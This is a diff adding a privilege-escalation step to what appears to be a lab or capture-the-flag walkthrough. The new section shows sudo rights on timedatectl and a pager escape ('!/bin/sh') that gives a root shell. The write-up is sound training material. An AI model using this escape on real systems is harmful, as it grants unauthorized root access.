@@ -120,8 +120,26 @@ broken@ubuntu:~$ id
 uid=1000(broken) gid=1000(broken) groups=1000(broken),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
 ```
 
+## 4.Privilege Escalation
 
+We can check for sudo permissions on this machine :
 
+```bash
+broken@ubuntu:~$ sudo -l
+Matching Defaults entries for broken on ubuntu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User broken may run the following commands on ubuntu:
+    (ALL) NOPASSWD: /usr/bin/timedatectl
+    (ALL) NOPASSWD: /sbin/reboot
+```
+
+we can use `timedatectl` to escalate our privileges :
+
+```bash
+sudo /usr/bin/timedatectl list-timezones
+!/bin/sh
+```
 
 
 
